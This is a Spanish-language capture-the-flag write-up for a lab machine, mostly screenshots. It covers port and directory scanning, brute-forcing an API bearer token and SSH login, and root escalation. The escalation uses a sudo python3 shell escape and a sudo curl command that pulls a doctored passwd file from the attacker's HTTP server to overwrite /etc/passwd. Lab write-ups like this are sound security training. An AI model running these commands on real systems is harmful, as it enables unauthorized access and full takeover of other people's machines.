nmap: 22, 5000

![image](https://github.com/user-attachments/assets/ebd72e6c-0cae-4a3a-a87b-32bd4d6d0d17)

entramos a la pagina por el puerto 5000

![image](https://github.com/user-attachments/assets/811b2243-4273-4387-9dc2-b4026ae5c599)

en la pagina nos da un código:

![image](https://github.com/user-attachments/assets/01e2fd20-e3b2-45c1-b936-a64d0e668314)

que si lo probamos da

![image](https://github.com/user-attachments/assets/6cd6e0a2-07ab-4874-be96-ca4646d644df)

nada interesante en si. pero en la pagina veremos algo, que cada ejemplo de API por ejemplo, GET O POST y así, tienen como comienzo "/api"

![image](https://github.com/user-attachments/assets/61cb2c5e-63f7-4eb6-abf2-0d7dcadce5e8)

hacemos un gobuster

![image](https://github.com/user-attachments/assets/05c80861-d4eb-4b1b-a349-56cdcd0beaad)

y nos da "users", lo probamos

![image](https://github.com/user-attachments/assets/f63bc726-1636-48bd-a84e-69a8bb5b039b)

pero la verdad no da mucho mas, buscamos alguna forma de explotar esto, buscamos alguna explotación de "APIs"  y encontre esta: https://github.com/Maalfer/bruteapi/blob/main/bruteapi.sh
que es un .sh, así que nos copiamos el código, creamos un .sh y le damos permisos de ejecución.  

como de por si el ".sh" no esta funcionando o dando algo, lo lanzamos con el comando que nos dio la pagina al principio

     curl -H "Authorization: Bearer password_secreta" http://localhost:5000/api/directorio_oculto

pero modificando para que me de alguna respuesta diferente porque de por si el, ".sh"  es para hacer fuerza bruta, pero basados en el código que nos dieron.  lanzamos

     bash exploit.sh http://172.17.0.2:5000/api/users /usr/share/wordlists/rockyou.txt

![image](https://github.com/user-attachments/assets/4acb1075-cd47-42e6-9fdb-43ba010f6058)

![image](https://github.com/user-attachments/assets/b6c688fc-31f7-49db-82ea-b472b35e5996)

obtenemos la contraseña

     password1

y utilizamos la opción 2 que es `Bearer Token`, lo que intentara dar como una ¨coincidencia¨  

entonces si lanzamos el comando

     curl -H "Authorization: Bearer password1" http://172.17.0.2:5000/api/users

![image](https://github.com/user-attachments/assets/cb1e8a2d-6a50-400c-9fe9-a9e905f123b2)

cambiamos en el código la "password_secreta" por la contraseña encontrada, cambiamos la IP a la de la maquina victima y "directorio_oculto" por "users" que fue lo que nos dio el gobuster. 
entonces obtenemos dos nombres 

     bob y dylan

hacemos una fuerza bruta:

![image](https://github.com/user-attachments/assets/fcfaa2e0-7165-4d07-a781-bdd9f0ff1eb5)

obtenemos a "bob" y "password1" y tenemos la conexion

![image](https://github.com/user-attachments/assets/ae41145a-bf80-43de-a64e-404bc3e0ca35)

dentro tenemos esto

![image](https://github.com/user-attachments/assets/a120b915-9440-4141-863f-60d680423e99)

un python3 y un "app.py", buscamos el de python3 https://gtfobins.github.io/gtfobins/python/#sudo

![image](https://github.com/user-attachments/assets/871ece54-cf63-483a-8345-3fc0a733595e)

lanzamos

     sudo -u balulero python3 -c 'import os; os.system("/bin/sh")'

y somos el usuario balulero

![image](https://github.com/user-attachments/assets/1b8f12b8-4ccc-4ddd-a6fd-b3d74c0b4dc6)

tenemos dentro un curl 

![image](https://github.com/user-attachments/assets/27228485-12ca-467b-8088-22bdcaa04472)

lo buscamos en gtf igual

![image](https://github.com/user-attachments/assets/a710f529-f3a5-4079-a34d-f7f5dca66292)

y tendremos que abrir un servidor y clonar en este caso el archivo "passwd" 

![image](https://github.com/user-attachments/assets/31c0fc41-4111-43fe-a2e3-45917d09aedf)

entonces copiamos el archivo de passwd desde la carpeta victima y en nuestra terminal le sacamos la "x" entonces ahora vamos a pasar desde nuestra maquina a la victima el archivo modificado desde un servidor como nos indica lo de FTFOBINS. 

abrimos el servidor 

     python3 -m http.server 

en la terminal victima colocamos 

    URL=http://172.17.0.1:8000/passwd
    LFILE=/etc/passwd
    sudo curl $URL -o $LFILE

entonces tendremos algo así 

![image](https://github.com/user-attachments/assets/1f2796d2-1a28-4920-b328-3cbcca474db6)

ahora verificamos que se remplazo el archivo por el modificado

![image](https://github.com/user-attachments/assets/6ccb9951-f25f-4284-9593-5e0952e42a68)

y vemos que no tiene la "x" así que se modifico correctamente, ahora haremos un "su root"

![image](https://github.com/user-attachments/assets/6ef77241-ba32-4bf9-bc58-550f5547d394)

y somos root! 
